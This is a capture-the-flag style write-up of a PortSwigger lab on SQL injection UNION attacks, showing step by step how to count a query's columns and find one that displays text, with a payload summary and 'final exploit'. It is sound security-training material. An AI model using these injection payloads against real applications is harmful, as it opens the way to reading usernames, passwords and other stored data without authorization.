# 🛡️ Lab: SQL Injection UNION Attack – Finding a Column Containing Text

## 📌 Platform

* PortSwigger Web Security Academy

---

## 🎯 Objective

Identify a column that supports **string data** and use it to display a given random string in the response.

---

# 🔍 Step 1: Identify SQL Injection

### 🧪 Test

```sql
'
```

### 🔍 Observation:

* Page returned an error

### 📌 Conclusion:

* SQL injection is possible

---

# 🧪 Step 2: Determine Number of Columns

### 🧪 ORDER BY Method

```sql
' ORDER BY 1--+
' ORDER BY 2--+
' ORDER BY 3--+
```

### 🔍 Observation:

* Works up to 3
* Error after that

### 📌 Conclusion:

* Query returns **3 columns**

---

### 🧪 UNION Confirmation

```sql
' UNION SELECT NULL,NULL,NULL--+
```

✔ Worked → column count confirmed

---

# 🎯 Step 3: Find Column Accepting String Data

### 📌 Goal:

* Identify which column:

  * accepts text
  * displays output

---

## 🧪 Testing Each Column

### Test Column 1

```sql
' UNION SELECT 'test',NULL,NULL--+
```

❌ Error → not string-compatible

---

### Test Column 2

```sql
' UNION SELECT NULL,'test',NULL--+
```

✔ Worked
✔ Text displayed on page

---

### Test Column 3

```sql
' UNION SELECT NULL,NULL,'test'--+
```

❌ Error → not string-compatible

---

### 📌 Conclusion:

* **Column 2 supports string data and is visible**

---

# 🧠 Step 4: Use Lab-Provided String

Lab provided:

```text
plpPbB
```

---

### 🧪 Final Payload

```sql
' UNION SELECT NULL,'plpPbB',NULL--+
```

---

### ✅ Result:

* String appeared in the response
* Lab marked as solved

---

# 🧠 Key Learnings

* UNION requires:

  * Same number of columns
  * Compatible data types
* Not all columns accept string data
* Need to test columns individually
* Important to find:

  * **String-compatible column**
  * **Visible column in response**

---

# ⚠️ Important Notes

* No brute force required
* The required string is always provided in the lab
* Testing with `'test'` helps identify valid column

---

# 🛠️ Payload Summary

### Injection Test

```sql
'
```

### Find Columns

```sql
' ORDER BY 1--+
' ORDER BY 2--+
' ORDER BY 3--+
```

### Confirm UNION

```sql
' UNION SELECT NULL,NULL,NULL--+
```

### Test String Columns

```sql
' UNION SELECT 'test',NULL,NULL--+
' UNION SELECT NULL,'test',NULL--+
' UNION SELECT NULL,NULL,'test'--+
```

### Final Exploit

```sql
' UNION SELECT NULL,'plpPbB',NULL--+
```

---

# 📌 Conclusion

This lab demonstrates how to:

1. Confirm SQL injection
2. Determine column count
3. Identify string-compatible column
4. Display controlled input in response

👉 This is a critical step before extracting real data (e.g., usernames, passwords)

---
